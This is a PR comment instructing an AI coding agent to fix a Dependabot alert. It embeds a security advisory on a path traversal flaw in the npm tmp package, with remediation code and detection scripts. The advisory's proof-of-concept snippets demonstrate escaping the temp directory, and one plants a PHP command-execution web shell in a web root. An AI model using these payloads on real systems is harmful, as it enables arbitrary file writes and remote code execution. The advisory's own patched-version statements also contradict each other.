@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** tmp (npm)
- **Severity:** HIGH
- **Vulnerable versions:** < 0.2.6
- **Patched version:** 0.2.6
- **CVE:** CVE-2026-44705
- **GHSA:** GHSA-ph9p-34f9-6g65
- **Manifest:** pnpm-lock.yaml

**Summary:**
tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape

**Description:**
### Summary

The tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.

### Details

**Root Cause:**
The vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.

**Technical Flow:**
1. **Filename Construction:** tmp builds filenames as `<prefix>-<pid>-<random>-<postfix>`
2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`
3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape
4. **File Creation:** File created at the resulting (potentially escaped) path

**Vulnerable Pattern:**
```javascript
// In tmp package internals
const name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;
const finalPath = path.join(tmpDir, opts.dir || '', name);
// No validation that finalPath remains within tmpDir
```

**Path Traversal Mechanics:**
- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure
- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely
- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text
- **Cross-platform impact:** Works on Windows (`..\\`), Unix (`../`), and mixed path systems

**Key Vulnerability Points:**
- No input validation on `prefix`, `postfix`, or `dir` parameters
- Direct use of user input in path construction
- Reliance on `path.join()` normalization without containment checks
- Missing post-construction validation that final path remains within intended directory

### PoC

**Basic Path Traversal via prefix:**
```javascript
const tmp = require('tmp');
const path = require('path');
const fs = require('fs');

// Create a controlled base directory
const baseDir = fs.mkdtempSync('/tmp/safe-base-');
console.log('Base directory:', baseDir);

// Escape via prefix
tmp.file({ 
  tmpdir: baseDir, 
  prefix: '../escaped' 
}, (err, filepath, fd, cleanup) => {
  if (err) throw err;
  
  console.log('Created file:', filepath);
  console.log('Relative to base:', path.relative(baseDir, filepath));
  // Output shows: ../escaped-<pid>-<random>
  
  cleanup();
});
```

**Directory Escape via postfix:**
```javascript
tmp.file({ 
  tmpdir: baseDir, 
  postfix: '/../../pwned.txt' 
}, (err, filepath, fd, cleanup) => {
  if (err) throw err;
  
  console.log('Escaped file:', filepath);
  console.log('Escaped outside base:', !filepath.startsWith(baseDir));
  
  cleanup();
});
```

**Absolute Path Bypass via dir:**
```javascript
tmp.file({ 
  tmpdir: '/safe/tmp/dir', 
  dir: '/tmp/evil-location',
  prefix: 'bypassed'
}, (err, filepath, fd, cleanup) => {
  if (err) throw err;
  
  console.log('Bypassed to:', filepath);
  // File created in /tmp/evil-location instead of /safe/tmp/dir
  
  cleanup();
});
```

**Advanced Multi-Vector Attack:**
```javascript
const maliciousOpts = {
  tmpdir: '/app/safe-tmp',
  dir: '../../../tmp',           // Escape base
  prefix: '../sensitive-area/',   // Further traversal
  postfix: 'malicious.config'     // Controlled filename
};

tmp.file(maliciousOpts, (err, filepath, fd, cleanup) => {
  // Results in file creation at: /tmp/sensitive-area/malicious.config
  console.log('Final malicious path:', filepath);
  cleanup();
});
```

**Real-World Attack Simulation:**
```javascript
// Simulate web API that accepts user file prefix
function createUserTempFile(userPrefix, content) {
  return new Promise((resolve, reject) => {
    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) => {
      if (err) return reject(err);
      
      fs.writeSync(fd, content);
      console.log('User file created at:', path);
      resolve({ path, cleanup });
    });
  });
}

// Attacker input
const attackerPrefix = '../../../var/www/html/backdoor';
createUserTempFile(attackerPrefix, '<?php system($_GET["cmd"]); ?>');
// Creates PHP backdoor in web root instead of temp directory
```

### Impact

**Arbitrary File Creation:**
- Files created outside intended temporary directories
- Attacker control over file placement location
- Potential to overwrite existing files (depending on creation flags)
- Cross-platform exploitation capability

**Attack Scenarios:**

**1. Web Application Configuration Poisoning:**
- User uploads file with malicious prefix/postfix
- tmp creates "temporary" file in application configuration directory
- Malicious configuration loaded on next application restart

**2. Cache Poisoning:**
- Application caches user content using tmp
- Attacker escapes to cache directory of different user/tenant
- Poisoned cache serves malicious content to other users

**3. Build Pipeline Compromise:**
- CI/CD system processes user PRs with tmp usage
- Malicious prefix escapes to build output directories
- Compromised build artifacts deployed to production

**4. Container Escape Attempt:**
- Containerized application uses tmp with user input
- Attacker attempts to escape container temp restrictions
- Files created in host-mapped volumes or sensitive container areas

**5. Multi-Tenant Service Bypass:**
- SaaS platform isolates tenants using separate tmp directories
- Tenant A escapes their tmp space to tenant B's area
- Cross-tenant data access and potential privilege escalation

**Business Impact:**
- **Data Integrity:** Unauthorized file placement can corrupt application state
- **Service Disruption:** Files in wrong locations may break application functionality  
- **Security Bypass:** Escape temporary isolation boundaries
- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations

### Affected Products

- **Ecosystem:** npm
- **Package name:** tmp
- **Repository:** github.com/raszi/node-tmp
- **Affected versions:** All versions with vulnerable path construction logic
- **Patched versions:** None currently available

**Component Impact:**
- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal
- `tmp.dir()` function - vulnerable to same parameter manipulation  
- `tmp.tmpName()` function - if using affected path construction

**Severity:** High  
**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)

**CWE Classification:**
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

### Remediation

**Input Validation and Sanitization:**

1. **Sanitize prefix/postfix:**
```javascript
function sanitizePrefix(prefix) {
  if (!prefix) return '';
  // Remove path separators and traversal sequences
  return path.basename(String(prefix)).replace(/[\.\/\\]/g, '-');
}

function sanitizePostfix(postfix) {
  if (!postfix) return '';
  // Allow only safe characters
  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');
}
```

2. **Validate dir parameter:**
```javascript
function validateDir(dir, baseDir) {
  if (!dir) return '';
  
  // Reject absolute paths
  if (path.isAbsolute(dir)) {
    throw new Error('Absolute paths not allowed for dir option');
  }
  
  // Resolve and check containment
  const resolved = path.resolve(baseDir, dir);
  const relative = path.relative(baseDir, resolved);
  
  if (relative.startsWith('..') || path.isAbsolute(relative)) {
    throw new Error('Dir option escapes base directory');
  }
  
  return dir;
}
```

3. **Post-construction path validation:**
```javascript
function validateFinalPath(finalPath, baseDir) {
  const resolved = path.resolve(finalPath);
  const relative = path.relative(path.resolve(baseDir), resolved);
  
  if (relative.startsWith('..') || path.isAbsolute(relative)) {
    throw new Error('Generated path escapes temporary directory');
  }
  
  return resolved;
}
```

**Secure Implementation Pattern:**
```javascript
function createTempFile(options) {
  const opts = { ...options };
  
  // Sanitize inputs
  opts.prefix = sanitizePrefix(opts.prefix);
  opts.postfix = sanitizePostfix(opts.postfix);
  opts.dir = validateDir(opts.dir, opts.tmpdir);
  
  // Create with sanitized options
  return tmp.file(opts, (err, path, fd, cleanup) => {
    if (err) return callback(err);
    
    // Validate final path
    try {
      validateFinalPath(path, opts.tmpdir);
    } catch (validationErr) {
      cleanup();
      return callback(validationErr);
    }
    
    callback(null, path, fd, cleanup);
  });
}
```

### Workarounds

**For Application Developers:**

1. **Input Sanitization:**
```javascript
// Sanitize before passing to tmp
function safeTmpFile(userOptions) {
  const safeOpts = {
    ...userOptions,
    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,
    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,
    dir: undefined // Don't allow user-controlled dir
  };
  
  return tmp.file(safeOpts);
}
```

2. **Path Validation:**
```javascript
function validateTmpPath(tmpPath, expectedBase) {
  const relativePath = path.relative(expectedBase, tmpPath);
  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {
    throw new Error('Temporary file path escaped base directory');
  }
  return tmpPath;
}
```

3. **Restricted Usage:**
```javascript
// Only use tmp with known-safe, literal values
tmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);
// Never: tmp.file({ prefix: userInput }, callback);
```

**For Security Teams:**

1. **Code Review Patterns:**
```bash
# Search for dangerous tmp usage
grep -r "tmp\.file.*prefix.*req\|tmp\.file.*postfix.*req" .
grep -r "tmp\.dir.*opts\|tmp\.file.*opts" .
```

2. **Runtime Monitoring:**
```javascript
// Monitor for files created outside expected temp areas
const originalFile = tmp.file;
tmp.file = function(options, callback) {
  return originalFile(options, (err, path, fd, cleanup) => {
    if (!err && options.tmpdir) {
      const relative = require('path').relative(options.tmpdir, path);
      if (relative.startsWith('..')) {
        console.warn('Path traversal detected:', path);
      }
    }
    return callback(err, path, fd, cleanup);
  });
};
```

### Detection and Monitoring

**Static Analysis:**
- Scan for tmp usage with user-controlled input
- Identify unsanitized parameter passing to tmp functions
- Review file creation patterns in temporary directories

**Runtime Detection:**
```javascript
// Log suspicious tmp operations
function monitorTmpUsage() {
  const originalTmpFile = require('tmp').file;
  
  require('tmp').file = function(options = {}, callback) {
    // Check for suspicious patterns
    const suspicious = [
      options.prefix && options.prefix.includes('..'),
      options.postfix && options.postfix.includes('..'),  
      options.dir && path.isAbsolute(options.dir)
    ].some(Boolean);
    
    if (suspicious) {
      console.warn('Suspicious tmp usage detected:', options);
    }
    
    return originalTmpFile.call(this, options, callback);
  };
}
```

**File System Monitoring:**
```bash
# Monitor file creation outside expected temp directories
inotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do
  if [[ "$event" == *"CREATE"* && "$file" != /tmp/tmp-* ]]; then
    echo "Unexpected file creation: $file"
  fi
done
```
### Acknowledgements

**Reported by**: Mapta / BugBunny_ai

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/2079)
